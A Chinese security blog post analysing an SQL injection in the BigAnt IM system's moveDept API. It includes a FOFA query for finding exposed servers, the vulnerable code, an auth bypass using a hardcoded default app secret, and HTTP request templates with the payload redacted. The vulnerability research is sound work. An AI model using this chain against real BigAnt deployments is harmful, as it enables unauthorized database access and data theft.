---
title: "大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞"
source: https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-movedept-sql注入漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/27 13:17
- 370浏览
- [0评论](#comment)
- 1小时阅读

深入探索

即时通信

应用

IM

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 \Api\Controller\DeptController::moveDept 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过在 moveDept 功能的相关参数中插入恶意构造的 SQL 查询语句，实现对后端数据库的非法操作，可能导致敏感信息泄露、数据篡改、绕过身份验证，甚至在特定配置下实现任意命令执行或获取系统控制权限。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

SQL注入检测工具

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

## 注入分析

系统是基于thinkphp 3.2架构，大部分采用数组形式的参数传递不存在sql注入

深入探索

应用程序

数据库

鉴权

在 ThinkPHP 3.2 中：

- `->where(array条件)` 使用**数组方式**传参是安全的（框架会自动参数绑定/转义）
- `->where("字符串拼接")` 使用**字符串拼接**外部输入是**危险的**
- `->query($sql)` / `->execute($sql)` 直接执行原生 SQL，如果拼接了用户输入则存在注入风险
- `I()` 函数虽有基本过滤，但不能完全防止 SQL 注入（特别是在字符串拼接场景下）

但是部分控制器的部分方法如**DeptController.class.php**下的**moveDept()**方法中

```
public function moveDept()
{
    $deptId = $this->q('dept_id',1);
    $parentDeptId = $this->q('target_parentdept_id',0);
    if ($deptId == $parentDeptId) {
       $this->responseFail(ERR_OP_ERR,L('_DEPT_MIGRATION_CAN_USE_YOURSELF_'));
    }
    //根据部门名称获取部门id
    $DeptModel = D('Common/Dept');
    $deptId = $DeptModel->field('dept_id,dept_parent_id')->where("dept_id = '".$deptId."'")->find();
......
if (!empty($parentDeptId)) {
    $parentDept = $DeptModel->where("dept_id = '".$parentDeptId."'")->getField('dept_id');
```

深入探索

application

app

即时通讯

`$deptId`和`$parentDeptId`均来自用户请求参数 `$this->q()`，直接拼接到 `where`字符串中，攻击者可通过构造恶意 `dept_id`参数注入SQL payload造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

## 权限分析

先看下控制器开头的初始化操作权限要求

代码安全审计

```
function _initialize() {

    parent::_initialize();
    $this->model = D('Common/Dept');
}
```

跟进`\Api\Controller\ApiBaseController::_initialize`看下

```
function _initialize() {
//        $this->request = new Request();

        //\Common\Lib\SaasSDK::autoFirstSaas();
        sp_log_url();

        $model_name = strtolower(CONTROLLER_NAME."/".ACTION_NAME);
        $allowArr=[
           'oauth/create_authen',
           'dept/dept_list_redis',
          'dept/op_record_list',
          'schedule/backup',
          'schedule/clear_file',
          'schedule/message',
          'server/server_status',
           'office/office_callback',
           'jinshan/authorize',
        ];

        if (!in_array($model_name, $allowArr)&&$this->isValidAuth){
            \Common\Lib\SaasSDK::autoFirstSaas();
            $this->validAuthen();
        }
    }
```

除了规定的部分接口如`oauth/create_authen`、`dept/dept_list_redis`等不需要鉴权，其余（当前控制器开启了鉴权验证时,默认开启）都需要经过`validAuthen`方法鉴权，大致流程如下

漏洞扫描服务

```
请求进入 → _initialize() 自动触发
    ↓
记录日志 (sp_log_url)
    ↓
生成当前路由标识 (控制器/动作)
    ↓
检查是否在白名单？
    ├─ 是 → 跳过鉴权，直接进入 Action 方法
    └─ 否 → 检查是否需要鉴权 ($isValidAuth)
            ├─ 否 → 跳过鉴权，进入 Action
            └─ 是 → 初始化 SaaS 租户环境
                   ↓
                   执行 validAuthen() 验证用户身份
                   ↓
                   通过 → 进入 Action
                   失败 → 返回 401/403 或跳转登录
```

而`validAuthen()`方法的鉴权逻辑如下

编程

```
protected  function validAuthen(){
        $saas_id = D('Common/Saas')->getField('saas_id');
        $authen = $this->q('authen',1);
        $appId = $this->q('app_id',0,APP_ID);
        $saasId = $this->q('ssid',0, $saas_id);
        $userId = $this->q('uid',1,1);
        $userName = $this->q('uname',0,"系统管理员");
        $res = \Common\Lib\SaasSDK::apiLogin($saasId,$userId,$appId,$authen);

    if (! $res['status']){
        $this->responseApi($res) ;
    }
        $this->appId = $appId ;
        $this->saasId = $saasId ;
        $this->userId = $userId;
        $this->userName = $userName ;
}
```

我们需要提供**authen、uid**其中uid好理解，就是用户id,且默认是1，重点关注**authen**的生成，

数据管理

总体流程如下

```
请求到达 → _initialize() → validAuthen()
    ↓
1. 获取默认租户（兜底）
2. 提取请求参数：
   ├─ authen (Token, 必填)
   ├─ uid (用户ID, 必填)
   ├─ ssid (租户ID, 可选)
   ├─ app_id (应用ID, 可选)
   └─ uname (用户名, 可选)
    ↓
3. SaaasSDK::apiLogin() 验证：
   ├─ Token 解密与签名验证
   ├─ 用户-租户关系校验
   └─ 权限时效检查
    ↓
4. 验证失败 → responseApi() 返回 401/403
   验证成功 → 保存身份信息到控制器属性
    ↓
进入业务 Action 方法（可通过 $this->userId 获取用户）
```

跟进`\Common\Lib\SaasSDK::apiLogin($saasId,$userId,$appId,$authen)`看下是如何验证的

网络安全

```
static function apiLogin($ssid,$uid,$appId,$authen){

        //到服务配置中认证
        $res = \Common\Lib\Oauth::validAuthen($authen, $appId, $ssid, $uid) ;

        //如果验证未通过
        if (! $res['status'])
                return $res ;

        //接口每次登录效率太低
        return self::trustLogin($ssid, $uid,'api') ;
}
```

跟进`validAuthen`

```
static function validAuthen($authen,$appId,$ssid,$uid){
        //得到密钥
        $info = self::getAppInfo($appId);
        $appSecret = '' ;
        if (! $info){
                return sp_api_fail(ERR_OP_ERR, L('_APPID_NOT_EXIST_')) ;
}

        $appSecret = $info['app_secret'] ;
        $res = self::bulidAuthen($appId, $appSecret, $ssid, $uid) == $authen ;

        return $res?sp_api_success():sp_api_fail(ERR_OP_ERR, L('_AUTH_CODE_ERROR_')) ;

}
```

先看 `getAppInfo`

```
static function getAppInfo($appId){

        $data = F('oauth_client') ;

        foreach($data as $row){
                if ($row['app_id'] == $appId){
                        return $row ;
                }
        }
        return null ;
}
```

从oauth\_client表提取出`app_id`，oauth\_client表默认如下

短信和即时消息

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-002-21f05cb53386.webp)](https://image.mrxn.net/c31abc55a1e64f82b586c16d85371cec.webp)

其中`app_id`为 system、yun对应的APP\_SECRET均为`www.upsoft01.com`，继续跟进`self::bulidAuthen($appId, $appSecret, $ssid, $uid) == $authen ;`看下它的实现方式

```
/**
 * 生成认证码
 * @param string $appId
 * @param string $appSecret
 * @param string $ssid
 * @param string $uid
 * @return string
 */
static function bulidAuthen($appId,$appSecret,$ssid,$uid){
        return hash('sha256', $appId . $appSecret . $ssid . $uid) ;
}
```

到此，如何获得authen也就清楚了，可以手动生成，也可以通过最开始分析的白名单部分，那里有个接口`oauth/create_authen`，它的实现逻辑如下

安全工具开发

```
/**
 * 获取 认证码的接口
 * @eg  http://127.0.0.1:8010/api/oauth/create_authen
 */
public function create_authen(){
        $uid = $this->q('uid',1);
        $app_id = $this->q('app_id',1);
        $app_secret = $this->q('app_secret',1);

        $saas_id = $this->q('ssid');

        $res = \Common\Lib\Oauth::bulidAuthen($app_id,$app_secret,$saas_id, $uid) ;
        $this->responseSuccess(['authen'=>$res]);
}
```

只需要提供**uid**、app\_id、app\_secret、**ssid**即可，其中ssid来自sys\_saas表

SQL注入检测工具

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-003-0c0d2a9fc3f3.webp)](https://image.mrxn.net/31103c6436d94279b500d5dceb754091.webp)

或者通过后台的修改头像部分获取，如下图所示

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-004-149f84f95d33.webp)](https://image.mrxn.net/15e590d5fd724be294966c4bf23488fe.webp)

# 漏洞复现

## 获取认证码

```
POST /api/oauth/create_authen HTTP/1.1
Host: bigant.local:8000
Content-Type: application/x-www-form-urlencoded

uid=1&app_id=system&app_secret=www.upsoft01.com&ssid=CC1743B5-E5D5-42CE-B5F6-42E24464C8D0
```

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-005-ea2894064e7e.webp)](https://image.mrxn.net/d3c2cc2af06e4564a0a00ea1b0428719.webp)

使用获取到的**authen：cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d**

软件

## SQL注入

> 两个参数均存在SQL注入
>
> 多种thinkphp传参、路由模式需要注意

```
POST /api/dept/moveDept HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=SQLI_POC
```

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-006-3deafefc062a.webp)](https://image.mrxn.net/f3639ebe9c4646c3b2d50bfca1debfda.webp)

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-007-c69f9f14cd50.webp)](https://image.mrxn.net/6a30fba8ff1d4250aa4022c3e5da005f.webp)

```
POST /index.php?s=/api/dept/moveDept HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=100&target_parentdept_id=SQLI_POC
```

[![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](images/img-008-3a40dc246c35.webp)](https://image.mrxn.net/d15acfeff69e4af3a278485aaf824b88.webp)

成功利用报错注入获取到系统数据库用户信息。

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#MySQL](https://mrxn.net/tag/MySQL)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.注入分析](#toc-4-1-)
- [4.2.权限分析](#toc-4-2-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取认证码](#toc-5-1-)
- [5.2.SQL注入](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
